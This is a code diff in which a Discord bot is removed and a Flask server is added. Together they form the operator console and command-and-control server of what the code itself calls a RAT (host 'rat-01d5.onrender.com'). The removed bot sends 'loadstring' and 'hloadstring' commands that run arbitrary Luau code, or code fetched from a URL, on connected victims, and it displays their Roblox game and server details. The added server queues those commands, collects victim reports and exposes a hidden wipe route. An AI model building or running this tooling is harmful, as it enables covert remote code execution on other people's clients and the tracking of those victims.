@@ -1,206 +1,93 @@
-import discord
-from discord import TextChannel
-from discord import app_commands
-import requests
-import os
-import sys
-import asyncio
+from flask import Flask, request, jsonify
+from threading import Lock, Thread
+import time
 
+app = Flask(__name__)
+commands = {}
+active_users = {}
+user_infos = {}
+lock = Lock()
 
-class MyClient(discord.Client):
-    def __init__(self):
-        intents = discord.Intents.default()
-        intents.guilds = True
-        intents.messages = True
-        super().__init__(intents=intents)
-        self.tree = app_commands.CommandTree(self)
-        self.active_users = set()
+USER_TIMEOUT = 10
 
-    async def on_ready(self):
-        await self.tree.sync()
-        print(f"online as {self.user}")
-        asyncio.create_task(self.poll_active_users())
+@app.route('/send', methods=['POST'])
+def send_command():
+    data = request.get_json()
+    target = data.get('to')
+    command = {
+        "command": data.get('command'),
+        "args": data.get('args')
+    }
 
-    async def poll_active_users(self):
-        await self.wait_until_ready()
-        guild = discord.utils.get(self.guilds, id=1392242413740883968)
-        if not guild:
-            print("guild not found")
-            return
+    if not target or not command["command"]:
+        return jsonify({"error": "invalid cmd data"}), 400
 
-        while True:
-            try:
-                category = discord.utils.get(guild.categories, name="users")
-                response = requests.get("https://rat-01d5.onrender.com/active")
-                if response.status_code == 200:
-                    new_active_users = set(response.json())
+    with lock:
+        if target not in commands:
+            commands[target] = []
+        commands[target].append(command)
 
-                    added = new_active_users - self.active_users
-                    removed = self.active_users - new_active_users
+    return jsonify({"status": "queued", "to": target})
 
-                    for uid in added:
-                        channel = discord.utils.get(guild.text_channels, name=uid)
-                        if not channel:
-                            if category:
-                                channel = await guild.create_text_channel(uid, category=category)
-                            else:
-                                print("category not found.. creating channel outside category...")
-                                channel = await guild.create_text_channel(uid)
-                        await channel.send("online")
+@app.route('/poll/<userid>')
+def poll(userid):
+    with lock:
+        active_users[userid] = time.time()
+        cmds = commands.get(userid, [])
+        commands[userid] = []
+    return jsonify(cmds)
 
-                    for uid in removed:
-                        channel = discord.utils.get(guild.text_channels, name=uid)
-                        if channel:
-                            await channel.send("offline")
+@app.route('/active')
+def get_active_users():
+    with lock:
+        return jsonify(list(active_users.keys()))
 
-                    self.active_users = new_active_users
+@app.route('/disconnect', methods=['POST'])
+def disconnect():
+    data = request.get_json()
+    userid = data.get('userid')
+    with lock:
+        active_users.pop(userid, None)
+        user_infos.pop(userid, None)
+    return jsonify({"status": "disconnected", "userid": userid})
 
-                else:
-                    print("failed to poll active users:", response.status_code)
+@app.route('/info_report', methods=['POST'])
+def info_report():
+    data = request.get_json()
+    userid = data.get('userid')
+    if not userid:
+        return jsonify({"error": "missing userid"}), 400
 
-            except Exception as e:
-                print("error polling:", e)
-            await asyncio.sleep(5)
-            
-client = MyClient()
+    with lock:
+        user_infos[userid] = data
+    return jsonify({"status": "info saved", "userid": userid})
 
+@app.route('/info_report/<userid>', methods=['GET'])
+def get_info(userid):
+    with lock:
+        info = user_infos.get(userid)
+    if not info:
+        return jsonify({"error": "no info found"}), 404
+    return jsonify(info)
 
-@client.tree.command(name="print", description="print smth")
-@app_commands.describe(arg="text 2 print")
-async def print_command(interaction: discord.Interaction, arg: str):
-    channel = interaction.channel
-    if not isinstance(channel, TextChannel):
-        await interaction.response.send_message("invalid channel", ephemeral=True)
-        return
+@app.route('/clear_omgpwmgpwemgpwempogpowempom6po34m6346346346', methods=['POST'])
+def clear_active():
+    with lock:
+        active_users.clear()
+        user_infos.clear()
+    return jsonify({"status": "cleared active users and info reports"})
 
-    uid = channel.name
+def cleanup_inactive_users():
+    while True:
+        time.sleep(5)
+        now = time.time()
+        with lock:
+            inactive = [uid for uid, last_seen in active_users.items() if now - last_seen > USER_TIMEOUT]
+            for uid in inactive:
+                active_users.pop(uid, None)
+                user_infos.pop(uid, None)
 
-    if not uid.isdigit():
-        await interaction.response.send_message("invalid channel", ephemeral=True)
-        return
+Thread(target=cleanup_inactive_users, daemon=True).start()
 
-    if uid not in client.active_users:
-        await interaction.response.send_message("offline", ephemeral=True)
-        return
-
-    payload = {"to": uid, "command": "print", "args": arg}
-
-    try:
-        res = requests.post("https://rat-01d5.onrender.com/send", json=payload)
-        if res.status_code == 200:
-            await interaction.response.send_message(f"ran `{uid}`.")
-        else:
-            await interaction.response.send_message("failed to talk 2 server", ephemeral=True)
-    except Exception as e:
-        await interaction.response.send_message(f"error {e}", ephemeral=True)
-
-
-@client.tree.command(name="loadstring", description="print('hi')")
-@app_commands.describe(code="LuaU code")
-async def loadstring_command(interaction: discord.Interaction, code: str):
-    channel = interaction.channel
-    if not isinstance(channel, TextChannel):
-        await interaction.response.send_message("invalid channel", ephemeral=True)
-        return
-
-    uid = channel.name
-
-    if not uid.isdigit():
-        await interaction.response.send_message("invalid channel", ephemeral=True)
-        return
-
-    if uid not in client.active_users:
-        await interaction.response.send_message("offline", ephemeral=True)
-        return
-
-    payload = {"to": uid, "command": "loadstring", "args": code}
-
-    try:
-        res = requests.post("https://rat-01d5.onrender.com/send", json=payload)
-        if res.status_code == 200:
-            await interaction.response.send_message("ran loadstring", ephemeral=False)
-        else:
-            await interaction.response.send_message("failed to talk to server", ephemeral=True)
-    except Exception as e:
-        await interaction.response.send_message(f"error {e}", ephemeral=True)
-
-
-@client.tree.command(name="hloadstring", description="fetch code from a website")
-@app_commands.describe(url="website URL")
-async def hloadstring_command(interaction: discord.Interaction, url: str):
-    channel = interaction.channel
-    if not isinstance(channel, TextChannel):
-        await interaction.response.send_message("invalid channel", ephemeral=True)
-        return
-
-    uid = channel.name
-
-    if not uid.isdigit():
-        await interaction.response.send_message("invalid channel", ephemeral=True)
-        return
-
-    if uid not in client.active_users:
-        await interaction.response.send_message("offline", ephemeral=True)
-        return
-
-    payload = {"to": uid, "command": "hloadstring", "args": url}
-
-    try:
-        res = requests.post("https://rat-01d5.onrender.com/send", json=payload)
-        if res.status_code == 200:
-            await interaction.response.send_message("sent hloadstring", ephemeral=False)
-        else:
-            await interaction.response.send_message("failed to talk to server", ephemeral=True)
-    except Exception as e:
-        await interaction.response.send_message(f"error {e}", ephemeral=True)
-
-
-@client.tree.command(name="info", description="user info")
-async def info_command(interaction: discord.Interaction):
-    channel = interaction.channel
-    if not isinstance(channel, TextChannel):
-        await interaction.response.send_message("WRONG CHANNEL", ephemeral=True)
-        return
-
-    userid = channel.name
-
-    if not userid.isdigit():
-        await interaction.response.send_message("WRONG CHANNEL", ephemeral=True)
-        return
-
-    if userid not in client.active_users:
-        await interaction.response.send_message("offline", ephemeral=True)
-        return
-
-    await interaction.response.defer(ephemeral=False)
-    
-    import aiohttp
-    async with aiohttp.ClientSession() as session:
-        async with session.get(f"https://rat-01d5.onrender.com/info_report/{userid}") as resp:
-            if resp.status != 200:
-                await interaction.followup.send("no info twin", ephemeral=True)
-                return
-            info = await resp.json()
-
-    embed = discord.Embed(title="Information")
-    embed.add_field(name="UserID", value=info.get("userid", "N/A"))
-    embed.add_field(name="Game", value=info.get("game", "N/A"))
-    embed.add_field(name="PlaceID", value=info.get("placeid", "N/A"))
-    embed.add_field(name="JobID", value=info.get("jobid", "N/A"))
-    #embed.set_thumbnail(url=info.get("thumbnail"))
-    #thumbnail_url = info.get("thumbnail")
-    #if thumbnail_url:
-    #    embed.set_thumbnail(url=thumbnail_url)
-
-    await interaction.followup.send(embed=embed, ephemeral=True)
-
-
-
-
-
-
-
-
-
-client.run(os.getenv("TOKEN"))
-
+if __name__ == '__main__':
+    app.run(debug=True)
